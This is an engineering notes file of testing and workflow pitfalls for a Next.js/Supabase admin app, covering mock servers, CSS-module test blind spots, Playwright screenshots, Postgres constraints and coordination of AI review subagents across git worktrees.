redirect branches and captured its screenshots against a throwaway copy of the mock in a scratchpad
(own port + `pw.capture.config.ts`, both deleted after). Add the two endpoints to the shared mock
when someone owns that file.

## auth-js prepends the `data:` prefix to `qr_code` itself — don't send a complete data-URI
`GoTrueClient._enroll()` does ``data.totp.qr_code = `data:image/svg+xml;utf-8,${data.totp.qr_code}` ``.
A mock returning an already-complete `data:image/svg+xml;utf-8,<encoded>` gets double-prefixed into a
broken image. The mock's `qr_code` must be **just the percent-encoded SVG**. Also: `listFactors()`
buckets only `status === "verified"` into `totp`; `all` holds the unverified ones too.

## Run mutation-testing reviewers ONE AT A TIME per worktree
Two `rx:review` agents mutation-testing the same worktree concurrently corrupted each other's
readings (one observed `signOutCalls === 2` because the other's identical mutation was live). Both
recovered, but serialize them — or give each a private copy — or a crash mid-mutation leaves the
tree dirty.

## A 2-option `<select value="">` does NOT render unselected — HTML re-selects the first option (ENG-616)
Requirement: a horse whose `sex` is NULL must show NO selection, never default to Male. The obvious
build — two `<option>`s and `value=""` — silently displays **Male**, because HTML's "ask for a reset"
algorithm says that when no option is selected, the first non-disabled one becomes selected. React
setting `value=""` matches no option, so the reset fires. Do-this: add
`<option value="" disabled hidden>` as the placeholder. It is selectable by the controlled `value`,
so the reset never runs, and `disabled` keeps it out of the operator's reach afterwards. A jsdom
`expect(select.value).toBe("")` catches this; asserting `selectedIndex === -1` does NOT (it is -1 only
in theory). Verified in real Chromium via `e2e/horses.spec.ts`.

## `lib/testing/supabase-fake.ts` swallows builder args — wrap it in `call-recorder` (ENG-616)
The fake's builder returns itself from `select`/`insert`/`update`/`eq` and DISCARDS the arguments, so
a test can only assert "no error came back". It cannot see a wrong insert, a too-narrow projection or
an IDOR. `lib/testing/call-recorder.ts` proxies the fake and records projections, mutation payloads
and `.eq()` filters; keep write-trace and filter arrays separate so `expect(rec.writes).toEqual([])`
still means "no write happened". Use it for any route ticket that writes.

## Validate a paired constraint in BOTH directions, or the CHECK fires anyway (ENG-616)
`horse_gelded_implies_male` is `check (not is_gelded or sex is not distinct from 'male')` — note
`is not distinct from`, NOT `=` (with `=`, `is_gelded=true, sex=NULL` evaluates to NULL and a CHECK
ACCEPTS NULL). Guarding only "isGelded true requires male" leaves the reverse hole: `PATCH
{sex:"female"}` on a stored gelding leaves `is_gelded=true` and Postgres 23514s. Whenever two columns
share a CHECK, the request that moves EITHER one must reconcile the other.

## Never return `error.message` from a Supabase failure (reinforced, ENG-616)
`fail("update_failed", error.message, 400)` puts the table, column and constraint names in front of
the operator — `HorseForm.tsx` renders `error.message` verbatim. Log `error.code` server-side, return
a generic sentence. Both horses routes now do this.

## `e2e/signin-mfa.spec.ts:29` is PRE-EXISTING red — do not chase it
"wrong code keeps the admin on /signin/mfa to retry" fails a Playwright strict-mode check:
`getByRole("alert")` matches both the error div and Next's `__next-route-announcer__`. Confirmed by
running it on a clean worktree at the base commit. Its serial group also skips 4 downstream tests, so
`npx playwright test` is NOT a green gate right now. Baseline before blaming your diff.

## The 07-add-horse mockup cannot express "no selection" — code deliberately deviates (ENG-616)
`06-stage1-design/mockups/web/admin/screens/07-add-horse.html` renders
`<option>Male</option><option>Female</option>`, i.e. a form preselected to Male, which is what
ENG-304 set out to remove. The build adds a disabled placeholder and is correct; the mockup is stale
on this one point. Do not "restore fidelity" by deleting the placeholder.
## A preview component that claims parity WILL drift — pin it, don't trust it (ENG-558)
`PostPreview.tsx` has said "duplicated in the admin repo so Compose can preview exactly what a
subscriber will see" since it was written. By Aug 2026 it was wrong in five independent ways at once:
a hardcoded `Race day` badge, no reaction bar or bookmark, the caption above the reactions instead of
below, a raw ALL-CAPS racing name, and a fixed `aspect-ratio: 16/9`. **Nothing failed.** Every drift
was invisible to the suite because no test asserted parity — they asserted the component rendered.

Three habits that actually catch this:
1. **The second copy is the bug.** Compose had a hand-rolled "mini" card in `ComposeScreen.tsx` AND a
   `PostPreview` in the modal, i.e. three copies of the member card counting mobile's. They diverged.
   One component rendered twice (a `compact` prop for scale) cannot.
2. **Assert tree ORDER, not just presence.** "Caption below the reaction bar" is a `compareDocumentPosition`
   assertion; `getByTestId("caption")` passes whatever the order is.
3. **Assert the ABSENCE of the thing that used to be hardcoded.** The badge test that matters is the
   one for a horse with NO race today.

## Vitest stubs CSS modules — every visual CSS change is unpinned by default (ENG-558)
`styles.postCard` is a stub object under Vitest, so a render test cannot see a border, a colour or an
`aspect-ratio`. **All four card-parity CSS changes in this ticket could be reverted with the suite
still fully green.** The fix is `compose-css.test.ts`: read `compose.module.css` off disk as text and
regex the specific declarations (no border, `16/10` fallback, neutral ground not `--brand-green-dark`,
Inter 500 `#3a3a38`). Ugly, and the only thing standing between a design decision and a silent revert.
Same trick pins DELETIONS: it asserts the dead `.phone`/`.web`/`.frames`/`.mini*` rules stay gone.

## Measure the picked FILE, never the HLS rendition (ENG-558)
Edit mode previews a Mux signed HLS source, and hls.js starts on a low-bitrate rendition, so
`videoWidth`/`videoHeight` report e.g. 640x360 for a 1080p asset. A readout that confidently prints
the wrong number is worse than no readout, so `MeasureState` has a third value — `off` — and edit mode
uses it: no readout at all. Only a file the operator just picked off their own disk is measured.

Related, and the reason a measurement timeout is NOT needed here: `HlsVideo` only engages hls.js when
`isHlsSrc(src)` (the path ends `.m3u8`). A local `blob:` object URL therefore goes down the plain
`video.src = src` path, where a decode failure fires a real `error` event. **If you ever point the
measured preview at an HLS source, that stops being true** — hls.js swallows its failures and the
readout would hang on "Measuring…" forever, which is exactly what PR #36 needed an 8s deadline for.

## Derive a printed orientation word from the printed RATIO, not the raw float (ENG-558)
1080x1081 is portrait by a hair but its label rounds to `1:1`, so a float-derived word rendered
"Portrait 1:1" in the operator's readout — a line arguing with itself. `ratioParts()` returns the two
numbers actually shown and the word is derived from those. Any readout that prints both a category and
a rounded value has this bug latent in it.

## Screenshot evidence for an aspect-ratio change needs a REAL file (ENG-558)
The 1x1 PNG the compose spec already used proves nothing about aspect — every ratio looks the same. No
ffmpeg on the box, and real client footage must never reach a PR screenshot, so `e2e/compose.spec.ts`
records synthetic webm in-page via `canvas.captureStream()` + `MediaRecorder` at exact dimensions. The
`<video>` then reports true intrinsic size. Paint corner ticks + a centre cross + the size as text, so
a centre crop is self-evident in the PNG and the shot is self-describing.

## Before styling a "parity" component, grep the stylesheet for the one that already exists (ENG-558)
The re-scope's own first cut of the Race day badge invented `.raceBadge`: solid `--brand-green`,
uppercase, weight 700. The mockup writes that badge three times on the compose screen as
`<span class="pill green dot">`, and `.pill` / `.pillGreen` / `.pillDot` were **already in
`compose.module.css`**, already a byte-for-byte match, and already rendering the Status chip one panel
above the preview. The result was two design languages for the same component on one screen — and a
regression from base, which had used the pill classes correctly.

The badge now composes them and `.raceBadge` carries only the mockup's inline `font-size: 10.5px` plus
`flex-shrink: 0`. **Rule of thumb: a ticket whose job is parity is exactly the ticket most likely to
hand-roll a component that already exists.** Grep first; a new class for an existing mockup component
is a smell, not a shortcut. Fresh-eyes review caught this one, the screenshots made it obvious, and no
test could have — see the CSS-module entry above for why.

## Anchor a "duplicate selector" CSS assertion to the line start (ENG-558)
`compose-css.test.ts#rule()` reads a rule out of the raw stylesheet, so it must reject a **second**
declaration of the same selector — the later one is what the cascade applies, and appending
`.postCard { border: 1px solid var(--line) }` to the file otherwise reverts a parity fix with a green
suite. That matters here because ENG-611 is sequenced straight after ENG-558 into this same file.

The naive version (`indexOf(sel + " {")` twice) is wrong: `.previewCompact .postCard {` **contains**
`.postCard {`, so every legitimate descendant override reads as a duplicate and the guard fails on
correct code. Only count occurrences at index 0 or immediately after a newline.

## The supabase-fake swallowed mutation payloads until ENG-611
**Symptom:** a route test could assert a mutation did not error, but never that it wrote the right
thing — a route that inserted the wrong `type`, or forgot `media_url`, went green.
**Cause:** `makeBuilder`'s `insert`/`update`/`delete` discarded their arguments.
**Do this:** `state.calls.mutations` (`{ table, op, payload }[]`) and `state.calls.storage`
(`{ bucket, path }[]`) now record them. Guard the PAYLOAD, e.g.

```ts
expect(state.calls.mutations).toContainEqual(
  expect.objectContaining({ table: "post", op: "update", payload: { media_url: "p1/original" } }),
);
```
`state.calls.storage.length === 0` is how you prove a `text` post made no Storage call at all.

## Compose's post type is CHOSEN, not sniffed (ENG-611)
`ComposeScreen` used to derive the type from the picked file's MIME. It no longer does: step 2 is an
explicit 4-option picker (`video|photo|voice|text`; `news` is deliberately absent) and the MIME is
**validation only** — a mismatch raises `data-testid="type-mismatch"` and never reclassifies the post.
**Consequence for any test that picks a file:** the default type is `video`, so a test that uploads an
image or audio file MUST select that type first or the pick is (correctly) rejected. This broke the
existing photo e2e spec and had to be fixed in the same PR.

## `.rx/mockups.md` was still stale after gotchas.md was fixed
The `dev-handover/` path was corrected in THIS file on 17 Aug but not in `.rx/mockups.md`, which kept
sending readers to a directory that has never existed. Both are fixed as of ENG-611. If you correct a
design-source path, correct it in **both** files.

## PostPreview renders its media box for every type, including text — FIXED in ENG-633
A1 (ENG-558) guards the media CHILDREN (`mediaUrl && mediaType === "photo"` / `"video"`) and
`resolveAspect` accepts `null`, so a text post did **not** crash the preview — but the empty
`.postMedia` box was still drawn. ENG-611 deliberately did not touch it (A1 owns the file).
ENG-633 closed it: the box and the orientation readout are now gated on `hasMediaBox`.

## `mediaType: null` reaching PostPreview means TEXT, not "no file picked yet"
**This is the one to remember before touching anything in `app/(dash)/compose/`.**
**Symptom:** ENG-633's ticket specified the fix as "hide the box when `mediaType === "text"`".
Implemented literally, that passes its own unit tests and **leaves the real screen broken**.
**Cause:** `ComposeScreen.tsx` reports a text post to the preview as `mediaType: isText ? null :
postType` — the preview never receives the string `"text"` from the real screen. And `postType` is
`useState<MediaType>(initial?.mediaType ?? "video")`, so it has **no "not chosen yet" state**:
since ENG-611 put an explicit type picker in step 2, `null` arriving at the preview means text and
nothing else.
**Do this:** guard on POSITIVE membership in `UPLOAD_TYPES` (`mediaType !== null &&
isUploadType(mediaType)`), never `!== "text"` — that covers both spellings, and `post.type`'s CHECK
still permits `news`. And treat any pre-ENG-611 test passing `mediaType: null` to mean "no file
chosen" as **stale**: it is now describing a text post. Two such tests in `PostPreview.test.tsx`
had to be respelled to `photo` in ENG-633.
**Wider lesson:** a ticket grilled before a sibling merges can encode the OLD contract. Read the
caller before building the guard the ticket describes.

## Two `rx:review` subagents in one worktree corrupt each other's test runs
**Symptom:** a clean suite goes red mid-run with failures that vanish on re-check, and the diff
"changes under you".
**Cause:** `rx:review` does mutation testing — it edits the component, runs vitest, restores. Two
of them dispatched in parallel against the SAME worktree interleave those edits, and any gate you
run at the same time reads a half-mutated tree. One reviewer also restored the component from its
own earlier snapshot, which would have silently reverted edits made in that window.
**Do this:** snapshot your intended diff first (`git diff | shasum`, plus copies of the touched
files) so you can prove the tree is unmutated before you commit; re-run the full gate only after
every reviewer has finished. Better: give each concurrent reviewer its own worktree, or run them
sequentially.


## Chrome serializes a computed `aspect-ratio` as `"<n> / 1"` (ENG-747)
**Symptom:** `await expect(locator).toHaveCSS("aspect-ratio", "0.5625")` times out with
`unexpected value "0.5625 / 1"`, even though the inline style really is `aspect-ratio: 0.5625`.
**Cause:** `PostPreview` sets the box with a bare number (`style={{ aspectRatio: `${aspect}` }}`),
but the COMPUTED value Playwright reads is normalised to the two-part form.
**Do this:** assert `"0.5625 / 1"`. The unit tests still assert the bare `"0.5625"`, because
`element.style.aspectRatio` (what jsdom reads) is the *specified* value, not the computed one — so
the same box legitimately needs two different expected strings in the two suites.

## The preview's clamp constants track mobile's post-card.tsx — re-read it before trusting them (ENG-747)
**Symptom:** `ASPECT_MIN`'s comment said "the tallest box a member ever sees" and every test agreed,
while the member app had rendered portrait video differently for six days. Fully green, entirely wrong.
**Cause:** `app/(dash)/compose/types.ts` duplicates mobile's clamp constants by design (separate
repos, no shared package). The 18 Aug reel work added `REEL_ASPECT_MIN = 9/16` to
`stablepass-mobile/src/components/post-card.tsx` and lifted the 4:5 floor **for portrait video only**;
nothing in this repo could notice.
**Do this:** any ticket touching `resolveAspect` / `describeOrientation` must first read
`stablepass-mobile/src/components/post-card.tsx` (the `isReel` / `aspectStyle` block) and diff the
rules by hand. The member card is the contract. Current rule, for the record:
`isReel = type === 'video' && 0 < raw < 1` -> `max(9/16, raw)`; everything else
`clamp(raw, 0.8, 1.91)`; photos have no Mux `aspect_ratio` so they fall to 16:10 here regardless.

## The loop-worker commit carve-out is NOT on main or the integration branches (ENG-747)
**Symptom:** an `rx:implement` worker reaches Step 8 and finds CLAUDE.md saying
"**Never commit or offer to commit.** Stop at `git add` + `git status`" — with no carve-out, on
both `origin/main` and `origin/feature/round6-v1`.
**Cause:** the amendment (commit `daee500`, "allow rx implement-loop workers to commit on their own
ticket branch") lives only on `chore/claude-md-loop-worker-commits` — **PR #38, still OPEN** since
18 Aug. Project memory records the rule as already amended; it is not.
**RESOLVED 24 Aug 2026 (ENG-769):** PR #38 is MERGED and the carve-out IS on `main` and on
`feature/round6-v1` — a loop worker may commit on its own ticket branch in its own worktree. The
rest of this entry is kept for the reasoning only; the decision no longer needs making.
**Do this (historical):** merge PR #38. Until then a worker must decide for itself, and the honest reading is
that the carve-out's own text and rationale cover an isolated worktree opening a reviewable PR
("without this carve-out a loop worker finishes its ticket, cannot ship it, and leaves the work
staged and uncommitted, which is more fragile than a commit"). Say so explicitly in the PR when
you rely on it. Never commit on `main` or push straight to an integration branch either way.


## Mobile's OWN comments about the clamp are aspirational — verify against lib/feed.ts (ENG-747)
**Symptom:** a comment in `app/(dash)/compose/types.ts` claimed "portrait PHOTOS keep the 4:5 clamp
on the member card". Fresh-eyes review proved it false, and it had been copied straight out of
`stablepass-mobile/src/components/post-card.tsx`'s comment on `REEL_ASPECT_MIN`, which says the
same thing.
**Cause:** `lib/feed.ts:189` is `aspectRatio: typeof row.aspect_ratio === 'number' ? ... : null`.
A photo has no Mux asset, so the column is null/absent, so mobile's `resolveAspect(null)` returns
`ASPECT_DEFAULT` 16:10. A portrait photo can never REACH the 4:5 clamp — it is not exempt from it,
it just never gets there. Both repos' comments described intent, not behaviour.
**Do this:** when mirroring the member card, take the rule from the CODE PATH (`lib/feed.ts` ->
`post-card.tsx`'s `isReel`/`aspectStyle`), never from a prose comment in either repo, and say in
your own comment which one you verified. Cross-repo duplicated constants are only as good as the
last person who checked them.

## Don't run `rx:review` against the LIVE worktree if it may run e2e (ENG-747)
**Symptom:** the reviewer's Playwright run re-captured `e2e/__screenshots__/08-*.png` mid-review,
minutes before the worker committed — so the committed PR evidence was the REVIEWER's capture, not
the worker's, and nobody noticed until the reviewer disclosed it.
**Cause:** the existing gotcha below covers two reviewers corrupting each other's MUTATIONS. This is
the adjacent hazard: `page.screenshot({path})` overwrites baselines in place (see the entry above),
so any reviewer that runs the e2e suite silently rewrites the artifacts the worker is about to
commit. Harmless here (same behaviour, 575 px / 0.026% apart) but it breaks provenance.
**Do this:** give the reviewer an `rsync` copy of the worktree with `node_modules` symlinked, or
tell it explicitly not to run `npm run e2e` / `npx playwright`. If it already ran, re-shoot from the
clean tree before committing and say so.

## A cross-repo "contract" test must read git REVS, not the sibling's working tree (ENG-745)
**Symptom:** `lib/posts/labels.test.ts` — which pins admin's 13 post-label presets against
stablepass-be's `docs/specs/api-contract.md` + the `post_label_preset` migration — failed with
"cannot reach the preset source of truth", pointing at a path that was *correct*.
**Cause:** the sibling repo was checked out on `main`, where the round-6 label work does not exist
yet. The file genuinely was not on disk. Resolving `<workspace>/stablepass-be/<path>` and
`readFileSync`-ing it makes the guard depend on whatever branch a DIFFERENT repo happens to have
checked out, which has nothing to do with drift.
**Do this:** resolve the sibling root via `dirname(resolve(gitCommonDir))` where `gitCommonDir` is
`git rev-parse --git-common-dir` (NOT `process.cwd()` — under a worktree that is
`<repo>/.claude/worktrees/<name>`). **The `resolve()` is load-bearing and easy to miss:**
`--git-common-dir` returns an ABSOLUTE path only from inside a linked worktree; in a normal checkout
it returns the bare relative string `.git`, so `dirname()` yields `"."` and the sibling path comes out
relative. Every lookup then misses and the guard fails for a reason unrelated to drift — green for the
loop (which runs in a worktree), RED for every human dev. Verify any such test in a plain clone, not
just in the worktree you wrote it in. Then read content with
`git -C <sibling> show <rev>:<path>` over a fallback chain of revs, working tree first, then
`origin/feature/<epic>-v1`, then `origin/main`, then `HEAD`. Include the `main` entries so the guard
survives the integration branch being merged and deleted. Fail loudly if no rev has it — a skipped
drift guard is a green suite that proves nothing.

## The compose e2e horse fixture had 3 horses, so it could not see a slice at 8 (ENG-745)
`COMPOSE_HORSES` in `e2e/mock-supabase.mjs` held three horses for four epics, while
`ComposeScreen` sliced the picker to `horses.slice(0, 8)`. No test or screenshot could ever have
caught the truncation, because the fixture never reached the cut. Now twelve. **Rule of thumb: a
fixture smaller than the limit under test cannot test the limit** — when a ticket removes a cap, a
slice or a page size, check the fixture actually exceeds it first. The nine added names deliberately
avoid "Mah" so the existing specs' `fill("Mah")` → `horse-opt-h1` path is unaffected.

## Discriminating a mock handler: check EVERY other read that selects your column (ENG-745)
Adding a compose-edit branch to `e2e/mock-supabase.mjs` keyed on `mux_playback_id` "which only this
read selects". It does not. `app/(dash)/posts/page.tsx` selects it for the library list, and
`app/api/admin/posts/[id]/preview/route.ts` selects it AND filters `id=eq.` — so neither the column
nor the id filter is a discriminator on its own. Placed ahead of the library branch, it swallowed the
list read and rendered an empty posts table; the vitest suite stayed fully green and only the full
Playwright run caught it. The working discriminator was the NESTED embed
`trainer:trainer_id(id,name,display_name)`, which only compose's edit read asks for.
**Do this:** before adding a branch, `grep -rn "<your column>" app/ lib/` and read every hit's select
string, then run the WHOLE e2e suite, not the spec you are writing. Both of this file's existing
warnings (order matters; match the table name exactly) were already written down — and still got hit
twice in one branch, in both directions.

## `.resultName` / `.resultSub` run together in the compose horse picker (open, pre-existing)
The picker rows render `Magic Timeby Peter Moody`: `compose.module.css:162-170` styles two adjacent
inline spans with no separator, and `.resultSub`'s `margin-top: 1px` implies `display: block` was
intended. Same pattern elsewhere on the screen ("Choose a videoVideo goes to Mux"). Pre-existing and
NOT fixed by ENG-745 (out of its decisions; R5 lands in that file next). It was equally visible with
the old 3-horse fixture — nobody had looked. One line to fix when someone owns that surface.

## No `.rx/fe-harness.md` in stablepass-admin, but the harness is real (ENG-745)
implement Step 0 wants a `.rx/fe-harness.md` manifest before UI work. This repo has none, yet it has
a complete, working Playwright harness (`e2e/` + `mock-supabase.mjs` on :8787 + `__screenshots__/`)
that six epics have used. Reuse it; do not treat the missing manifest as BLOCKED. Someone should
write the manifest to describe what already exists.

## CORRECTION: the loop-worker commit carve-out IS on main now — but NOT on the integration branch (ENG-748)
The ENG-747 entry above says PR #38 is "still OPEN since 18 Aug". It has since MERGED:
`origin/main` is `26cd255 chore: allow rx implement-loop workers to commit on their own ticket
branch (#38)` and main's CLAUDE.md carries the carve-out.
**But `git merge-base --is-ancestor 26cd255 origin/feature/round6-v1` is FALSE.** The integration
branch was cut before #38, so a worker in a round-6 worktree still reads the un-amended
"**Never commit or offer to commit.**" and can reasonably think it has no permission.
**Do this:** check `origin/main`'s CLAUDE.md, not just your branch's, before concluding you may not
commit — an integration branch is a snapshot and lags policy changes on main. The carve-out's own
terms (own ticket branch, own worktree, PR into the integration branch, never merge) are what
governs. Say in the PR that you relied on main's version. Merging main into the round-6 integration
branch would end the confusion for the remaining round-6 tickets.

## `react-hooks/set-state-in-effect` SILENTLY STOPPED analysing ComposeScreen.tsx (ENG-748)
**Symptom:** after adding the multi-photo code, `npm run lint` gained one warning —
"Unused eslint-disable directive (no problems were reported from
'react-hooks/set-state-in-effect')" — on the `// eslint-disable-next-line` in the schedule-prefill
effect, a line the ticket never touched.
**Cause, verified not guessed:** the rule did not stop *finding that one*; it stopped analysing the
COMPONENT. Probe: insert a fresh, undisguised `useEffect(() => { setPhotoError("probe"); }, [])`
into the same component and re-lint — it is NOT reported. The compiler-backed rules in
eslint-config-next 16.2.10 bail out on a function past a complexity/size threshold, and
ComposeScreen (now ~1700 lines) crossed it.
**Why it matters:** this is a silently DISABLED lint rule, not a cosmetic warning. Any future
set-state-in-effect bug in this file will not be caught, and the warning is the only hint.
**Do this:** do not "fix" it by deleting the directive — if the component ever shrinks the rule
resumes and the directive is needed again, so removing it plants a latent error. Treat the warning
as the marker that the file is past the analyser's limit, and take it as a real argument for
splitting ComposeScreen (the strip, the horse picker and the schedule block are all extractable).
Re-run the probe above before assuming the rule covers any large component in this repo.

## `e2e/__screenshots__/` numeric prefixes are ONE global sequence — check the high-water mark (ENG-748)
**Symptom:** new screenshots written as `18-`..`22-` collided with ENG-745's
`18-compose-label-picker.png` … `22-compose-horse-picker-scrolled.png`. Same numbers, different
subjects, no overwrite and no error — just an unreadable directory.
**Cause:** the prefix is a workspace-wide ordering, not per-spec, and a fresh `ls` of the directory
is easy to skim past because ENG-745's files sort after the ones you remember.
**Do this:** `git ls-files e2e/__screenshots__/ | sed 's|.*/||' | sort | tail` FIRST and start above
the highest committed number (23 as of ENG-748, so ENG-748 took 24-28). Also re-run your spec after
renumbering and re-check `git status` — the old files are untracked and must be deleted, not left
behind.

## jsdom has no `URL.createObjectURL`, so compose renders NO <img> in unit tests (ENG-748)
**Symptom:** `zone.querySelector("img")` is null in a ComposeScreen test even though the same
element is plainly there in the Playwright shot.
**Cause:** `objectUrl()` guards on `typeof URL.createObjectURL === "function"` and returns null under
jsdom, so every local-file preview renders with no image element at all.
**Do this:** in vitest, assert on the TEXT that names the media (the upload meta line) or on
testids, never on an `<img>`'s `src`; and note `getByRole("presentation")` does not match
`<img alt="">` either. The picture itself is only provable in the Playwright evidence — which is a
good reason not to let the e2e shots be the thing you skip.

## An rsync copy of a WORKTREE is not isolated — it keeps pointing at your gitdir (ENG-748)
**Context:** the ENG-747 entry above says to give a reviewer "an `rsync` copy of the worktree with
`node_modules` symlinked" so its Playwright run cannot rewrite your screenshots. That advice is
right about the screenshots and **incomplete about git**.
**Symptom:** `git -C /tmp/copy log --oneline -1` in the copy reports the commit you made in the
ORIGINAL worktree seconds ago — even though the copy's files are a stale snapshot.
**Cause:** a linked worktree's `.git` is a one-line FILE (`gitdir: <repo>/.git/worktrees/<name>`),
not a directory. rsync copies that line verbatim, so every git command in the copy resolves to the
SAME gitdir, HEAD and index as the original. Two consequences:
  * `git status` / `git diff` in the copy describe your tree, not the copy's files.
  * **`git checkout -- <file>` or `git stash` in the copy writes into the ORIGINAL worktree**, which
    is exactly what a reviewer does to restore a file after a mutation test.
**Do this:** three-dot commit-to-commit diffs (`git diff <base>...HEAD`) are safe — they read commits
only. But if the reviewer will MUTATE files, either (a) delete the copy's `.git` entirely and hand it
the diff as a patch file, or (b) tell it to restore with `cp` from a backup it makes itself, never
with `git checkout`. Then verify before you commit:
`git rev-parse HEAD` + `git status --porcelain` must match what you recorded before dispatching.

## A test that reads `img src` in jsdom can be VACUOUS — and pass only via a leaked global (ENG-748)
**Symptom:** three reorder tests asserted display order with
`tiles.map(t => t.querySelector("img")?.getAttribute("src") ?? "")`. They passed. They also passed
with the feature deleted — `movePhoto` mutated to `return list` left them green when run with
`-t "reorder"`, and only went red in a whole-file run.
**Cause, two layers.** (1) jsdom has no `URL.createObjectURL`, so `previewUrl` is null, no `<img>`
renders, and the map returns `["","",""]` — comparing empty strings to empty strings. (2) It appeared
to work in the full run only because an EARLIER, unrelated `describe` does
`Object.defineProperty(URL, "createObjectURL", …)` in its `beforeEach` and **never restores it**, so
later blocks silently inherit a stub they never asked for and whose presence depends on file order.
**Do this:** every `describe` that needs an object URL must install AND restore its own stub in
`beforeEach`/`afterEach`. Assert display order on an attribute that renders unconditionally — add a
`data-*` carrying a stable id — never on `img src`. And validate any ordering test the only way that
means anything: break the reordering function and run the test **in isolation** (`-t`), not just as
part of the file. A whole-file pass can be borrowed from a neighbour; a `-t` pass cannot.

## `fullPage` screenshots + `position: fixed` chrome = the sidebar painted mid-page (ENG-748)
**Symptom:** `25-compose-multi-reorder.png` had the fixed sidebar and topbar rendered ~730px down the
image, overlapping content, with a blank gutter above. `24-` and `28-` from the same spec were clean.
**Cause:** Playwright's `fullPage` capture stitches the page while `position: fixed` elements stay
pinned to the VIEWPORT. The clean shots were taken at scroll top; the corrupted one was taken after
scrolling down to click the reorder buttons.
**Do this:** `await page.evaluate(() => window.scrollTo(0, 0))` plus two `requestAnimationFrame`s
before every `fullPage` shot in a spec that clicks anything below the fold — or screenshot the
element instead of the page. And LOOK at every committed screenshot before you ship it: this one is
the ticket's headline evidence and the corruption is obvious to a human and invisible to a test.

## `npm test` cannot see a broken stylesheet — only `npm run build` can (ENG-766)
Vitest stubs CSS modules, so a malformed `trainers.css` (an unbalanced `/* */`, e.g. from a careless
`sed` on a comment header) passes typecheck AND the whole 480-test suite, then fails `next build` with
a bare `at <unknown> (…/trainers.css:250:81)`. **Do this:** after ANY edit to a `.css` file, re-run
`npm run build`, not just `npm test`. A quick balance check catches it first:
`python3 -c "s=open('path.css').read(); print(s.count('/*'), s.count('*/'))"`.

## Commit BEFORE mutation testing, or `git checkout --` silently reverts your fix (ENG-766)
Mutation-testing with `apply mutation → run → git checkout -- <file>` restores from **HEAD**. With the
fix still uncommitted, the first checkout reverts the fix itself, and every later mutation is applied to
already-reverted code — so the "test failed as required" result is meaningless (the mutation was a
no-op; the failure came from the missing fix). Observed live: it wiped four source fixes mid-run.
**Do this:** commit, then mutate. Assert the mutation actually applied (`assert n != s`) and re-run the
target after each restore to prove the tree is green again before the next mutation.

## `page.screenshot` of a `(dash)` form exposes mock gaps the app never had (ENG-766)
The first edit-page screenshot showed **7 contacts belonging to 7 different trainers**, because
`e2e/mock-supabase.mjs`'s generic `/rest/v1/<table>` dispatcher ignores query filters and the edit page
reads `.eq("trainer_id", id)`. The app is correct; the fixture is not. Also, `/trainers/:id/edit` needs
an anchored `id=eq.` branch or it 404s (the documented `.maybeSingle()` cardinality trap), and there was
**no PATCH handler for `/rest/v1/trainer` at all** — the trainer edit save had never been exercised in
e2e. When adding a filter to the SHARED generic dispatcher, scope it to the one table
(`table === "trainer_contact"`), since `horse` also carries `trainer_id`.

## A test fake that ECHOES the request can never disagree with the implementation (ENG-766)
`remove(keys)` faked as `paths.map(name => ({name}))` makes any assertion about the *response* vacuous:
the implementation and the fake are the same source of truth. That hid a check on `FileObject.name`
whose real wire shape was never measured — if `name` is relative to the prefix rather than the full key,
every un-publish would have falsely failed, with a green suite. **Do this:** model what the SERVICE
knows, not what the caller sent (here: report only the keys that actually exist), so the fake can
contradict the code.

## A too-wide PostgREST projection renders a screen EMPTY, not broken (ENG-766)
Adding `marketing_visible` to the trainers list select against a DB where the column is not yet deployed
returns an error that `listTrainers` swallows via `(trainers ?? [])`. The list renders empty while the
filter chips — a separate `select("status")` — still count 8. There is no 500 and no console error.
**Do this:** when a slice depends on another repo's migration, verify the columns exist in the TARGET
project (`supabase migration list` in stablepass-be shows local vs remote), not just that the migration
merged. Merged ≠ deployed; as of 24 Aug the live project trailed be `main` by two migrations.

## Probe the live Supabase project without credentials via the public storage endpoint (ENG-766)
`curl "https://<ref>.supabase.co/storage/v1/object/public/<bucket>/x.jpg"` needs no key and answers
`NoSuchBucket` when the bucket is absent OR not public — useful as a fast deploy check. It does NOT
distinguish "missing" from "private" (a private bucket that exists answers identically), so pair it with
`supabase migration list` before concluding anything. Note `supabase/.temp/project-ref` is the linked
project; `20260720120005_cron_schedules.sql` hardcodes a DIFFERENT ref, which is not the app's target.

## Merging two "order-sensitive" mock branches: check the discriminator, not the comment (main -> feature/round6-v1, 25 Aug 2026)
**Symptom:** `origin/main` (ENG-766, `/rest/v1/trainer` handlers) and `feature/round6-v1` (ENG-745,
the compose EDIT `/rest/v1/post` handler) both added a branch at the SAME anchor in
`e2e/mock-supabase.mjs`, and both carried comments insisting their branch is order-sensitive. That
reads like a merge that needs a judgement call about which side wins.
**Cause:** it is not one. The two groups discriminate on `url.pathname` with an exact `===` against
DIFFERENT tables, so they are mutually exclusive and neither can shadow the other in either order.
An "order-sensitive" comment describes a branch's relationship to the GENERIC branches below it
(`startsWith("/rest/v1/post")` + `status`, and the catch-all `startsWith("/rest/v1/")`), never to an
unrelated sibling. Resolve by asking which discriminators are supersets of which, not by trusting
either side's prose.
**The real trap in this merge:** both sides' new blocks ended with the identical three lines
(`sendJson(res, 200, accept.includes("pgrst.object") ? match : ...); return; }`), so git hoisted that
tail OUT of the conflict and placed it after `>>>>>>>`. Stripping the markers and keeping both sides
therefore yields ONE shared tail for TWO `if` bodies: the first branch falls through into the second
and only the second returns. It still parses. Reviewing the conflict hunk alone will not show it.
**Do this:** when a conflict's two sides end in identical lines, do not hand-merge the hunk. Extract
each side's block whole from `git show :2:<file>` and `:3:<file>`, confirm each is brace-balanced on
its own (`node --check` proves syntax, not fall-through), then splice. And order the result
specific-before-generic and grouped by table, the way the `/rest/v1/horse` block already documents.

## A committed screenshot can outlive the copy it captured (ENG-746, 25 Aug 2026)
**Symptom:** `e2e/__screenshots__/23-trainer-slug-collision.png` was committed showing the message
"The name sets the profile web address (/chris-waller)" while the tree shipped "turned into that
trainer's unique ID (chris-waller)". The PNG is a build artifact but it is also the PR's evidence, so
the PR would have argued for copy the branch had already rejected as false, and a reviewer reading
the screenshot instead of the code would have approved the wrong thing.
**Cause:** the capture commit landed BEFORE the commit that corrected the copy. Nothing relates a
committed PNG to the source it depicts: `tsc`, `lint` and `vitest` are all blind to it, and the e2e
assertions that pin the copy live in the spec, not in the image. A screenshot is the one artifact in
the repo with no integrity check at all.
**Do this:** whenever the last commit touching copy/markup is NEWER than the last commit touching
`e2e/__screenshots__/`, re-run the capture before opening the PR - it costs ~20s and is the only way
to know. `git log -1 --format=%ct -- <src>` vs `git log -1 --format=%ct -- e2e/__screenshots__/`
